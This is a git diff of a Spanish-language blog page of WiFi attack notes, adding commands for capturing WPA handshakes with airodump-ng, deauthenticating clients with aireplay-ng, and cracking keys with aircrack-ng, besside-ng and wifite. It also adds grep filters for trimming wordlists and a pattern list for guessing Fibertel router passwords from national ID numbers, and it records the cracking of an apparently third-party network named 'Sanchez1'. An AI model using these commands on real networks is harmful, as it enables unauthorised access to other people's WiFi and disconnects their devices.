@@ -33,7 +33,7 @@ sudo su export AIRGEDDON_WINDOWS_HANDLING=tmux airgeddon Más info acá: https:/
 sudo wifite sudo airgeddon Podés capturar el handshare y intentar romperlo usando diccionarios, fuerza bruta con airgeddon, creando gemelo malvado. Podes crear diccionarios específicos así:">
   <meta itemprop="datePublished" content="2024-07-21T19:48:09-03:00">
   <meta itemprop="dateModified" content="2024-07-21T19:48:09-03:00">
-  <meta itemprop="wordCount" content="3939">
+  <meta itemprop="wordCount" content="4016">
   <meta itemprop="keywords" content="Atacando,Redes,Ciberseguridad,Vulnerabilidades">
   
   <meta name="twitter:card" content="summary">
@@ -434,11 +434,12 @@ Una serie de 4 paquetes intercambiados entre el cliente y el punto de acceso dur
 </span></span></code></pre></div><h3 id="escuchamos-para-capturar-el-handshake">Escuchamos para capturar el handshake</h3>
 <p><code>airodump-ng wlan1mon --bssid 1C:5F:2B:E7:77:EA --channel 11 --write handshake --output-format cap</code></p>
 <p>Cuando el handshake es capturado se guardará en el directorio en donde estás situado.</p>
-<h3 id="deautenticamos-a-los-clientes-para-que-se-vuelvan-a-conectar-y-así-capturar-el-handshake">Deautenticamos a los clientes para que se vuelvan a conectar y así capturar el handshake.</h3>
+<h3 id="deautenticamos-a-los-clientes-para-que-se-vuelvan-a-conectar-y-así-capturar-el-handshake-simultáneamente">Deautenticamos a los clientes para que se vuelvan a conectar y así capturar el handshake. (Simultáneamente)</h3>
 <p><code>aireplay-ng --deauth 0 -a 1C:5F:2B:E7:77:EA -c 40:E2:30:CC:1E:8D wlan1mon # donde -a es el SSID y -c es el cliente.</code></p>
+<p>O podés hacerlo sin el cliente <code>sin la opción -c</code></p>
 <h3 id="una-vez-que-capturamos-el-handshake-intentamos-descubrir-la-contraseña-usando-un-diccionario">Una vez que capturamos el handshake, intentamos descubrir la contraseña usando un diccionario.</h3>
-<p><code>aircrack-ng handshake.cap -w passwords.txt</code>
-En KaliLinux hay un diccionario muy conocido que se llama rockyou.txt y otros diccionarios que se pueden ver ejecutando el comando <code>wordlists</code>.</p>
+<p><code>aircrack-ng handshake.cap -w passwords.txt</code></p>
+<p>En KaliLinux hay un diccionario muy conocido que se llama rockyou.txt y otros diccionarios que se pueden ver ejecutando el comando <code>wordlists</code>.</p>
 <pre tabindex="0"><code>
 
 ### Detener la captura del handshake:
@@ -686,7 +687,8 @@ Archive: <a href="https://archive.is/wip/JgyL7">https://archive.is/wip/JgyL7</a>
 <p>Salio la clave. Antes por ataque de WPS pude descubrir que uso una palabra y 4 numeros. Entonces baje el diccionario de latin en weakpass y filtre las palabras que contengan EXACTAMENTE 4 numeros al final con <code>grep</code>, si alguno sabe una mejor forma de hacer esto diganme. De un diccionario de 11 gigas pase a uno de 1,7 gigas. En 3 dias salio clave solo con CPU (<code>Intel Celeron 2.0GHz</code>)</p>
 <pre tabindex="0"><code>grep -E &#39;\b([^0-9]*[0-9]){4}$[^0-9]*\b&#39; weakpass_4.latin.txt &gt; sanchez_dicc1
 grep -E &#39;^[^0-9]*([0-9]){4}$&#39; sanchez_dicc1 &gt; sanchez_dicc2
-</code></pre><p>aircrack-ng -w sanchez_dicc2 /home/esotericwarfare/Sanchez1/handshake-FE:A0:3F:21:00:91.cap</p>
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aircrack-ng -w sanchez_dicc2 /home/esotericwarfare/Sanchez1/handshake-FE:A0:3F:21:00:91.cap
+</span></span></code></pre></div><h4 id="observación">Observación</h4>
 <p>Supongamos que corremos el diccionario de 46 gigabytes o hacemos un ataque de gemelo malvado o hacemos un ataque de WPS o hacemos un ataque de WEP (obsoleto) y encontramos que la contraseña es: sakura2629</p>
 <p>Ahora ya conocemos el patrón de la contraseña.</p>
 <p>Entonces tomamos un diccionario de 46 gigas y aplicamos los siguientes filtros:</p>
@@ -707,15 +709,37 @@ grep -E &#39;^[^0-9]*([0-9]){4}$&#39; sanchez_dicc1 &gt; sanchez_dicc2
 <li>Solo nos quedamos con las palabras que contengan 29: aprox. 500 megabytes que lo podés probar en 3 horas.</li>
 </ul>
 <p>Es decir de un diccionario de 46 gigabytes nos quedamos con 3 diccionarios que lo podemos probar en menos de 1 día.</p>
-<p>Fibertel WiFi fjw</p>
-<p>004+DNI+fjw
-003+DNI+fjw
-001+DNI+fjw
-002+DNI+fjw
-014+DNI+fjw
-420+DNI+fjw
-412+DNI+fjw</p>
-<p>Saludos, que Dios los bendiga.</p>
+<h4 id="fibertel-wifi-xxx">Fibertel WiFi xxx</h4>
+<p><a href="https://imlauera.github.io/crackear_fibertel/">https://imlauera.github.io/crackear_fibertel/</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>004+DNI
+</span></span><span style="display:flex;"><span>004+DNI+abc
+</span></span><span style="display:flex;"><span>004+DNI+w1f1
+</span></span><span style="display:flex;"><span>004+DNI+xxx
+</span></span><span style="display:flex;"><span>003+DNI+xxx
+</span></span><span style="display:flex;"><span>001+DNI+xxx
+</span></span><span style="display:flex;"><span>002+DNI+xxx
+</span></span><span style="display:flex;"><span>014+DNI+xxx
+</span></span><span style="display:flex;"><span>420+DNI+xxx
+</span></span><span style="display:flex;"><span>412+DNI+xxx
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><h4 id="besside-ng-solo-sirve-para-wpa">Besside-ng (solo sirve para WPA)</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo su
+</span></span><span style="display:flex;"><span>airmon-ng check kill
+</span></span><span style="display:flex;"><span>airmon-ng start wlp1s0
+</span></span><span style="display:flex;"><span>airodump-ng wlp1s0
+</span></span><span style="display:flex;"><span>besside-ng -b BBSID
+</span></span></code></pre></div><h4 id="more-hacking">More hacking</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>sudo su
+</span></span><span style="display:flex;"><span>airmon-ng check kill
+</span></span><span style="display:flex;"><span>airmon-ng start wlp1s0
+</span></span><span style="display:flex;"><span>airodump-ng wlp1s0
+</span></span><span style="display:flex;"><span>sudo airodump-ng -w wificapture -c 11 --bssid ... wlp1s0 # wificapture para capturar el handshake
+</span></span><span style="display:flex;"><span>sudo aireplay-ng --deauth 0 -a BSSID_NETWORK wlp1s0
+</span></span><span style="display:flex;"><span>wireshark wificapture-01.cap
+</span></span><span style="display:flex;"><span>sudo airmon-ng stop wlp1s0 
+</span></span></code></pre></div><h3 id="wifite">wifite</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wifite
+</span></span></code></pre></div><p>Saludos, que Dios los bendiga.</p>
 
 </div>
 
